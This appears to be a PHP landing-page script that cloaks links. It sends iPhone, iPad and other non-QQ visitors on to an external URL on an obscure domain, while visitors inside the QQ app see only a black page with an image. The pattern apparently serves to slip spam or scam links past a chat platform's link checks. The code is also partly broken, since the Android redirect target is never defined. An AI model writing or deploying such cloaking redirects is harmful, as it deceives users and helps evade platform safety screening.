<?php
//$iosUrl = 'http://0318.esyhy.com/a10219_2ed500835a.html';
$iosUrl = 'http://2zg6m.shishiyandeng.com:9000/xinnia.html';//IOS要跳转的百度链接



if ( strpos( $_SERVER[ 'HTTP_USER_AGENT' ] , 'iPhone' ) || strpos( $_SERVER[ 'HTTP_USER_AGENT' ] , 'iPad' ) ) {
?>
<script>
if(navigator.userAgent.indexOf('QQ/') == -1){window.location.href = "<?php echo $iosUrl ?>";}
</script>

<?php
} else {
	if ( false == checkqq() ) {

		jump( $androidUrl );
	}
}
function jump( $url )
{
	header( 'HTTP/1.1 301 Moved Permanently' );
	header( "Location: $url" );
	die();
}

function checkqq()
{
	$agent = ( !isset( $_SERVER[ 'HTTP_USER_AGENT' ] ) ) ? FALSE : $_SERVER[ 'HTTP_USER_AGENT' ];
	$agent = strtolower( $agent );

	return ( strpos( $agent , strtolower( 'qq/' ) ) !== false );
}

function getRandomString( $number )
{
	$string = 'abcdefghijklmnopgrstuvwxyz0123456789a';
	$array = str_split( $string );
	$result = '';
	for ( $i = 0 ; $i < $number ; ++$i ) {
		$result .= $array[ rand( 0 , 36 ) ];
	}

	return $result;
}

?>
<style type="text/css">
    body {
        background-color: #000
    }
</style>
<img src="./ok.png" width="100%"/>;
<div style="display:none">

</div>
<link rel="stylesheet" href="skin/css/style.css">
<div class="share"><img src="skin/images/ts.png" /><div class="clear"></div></div>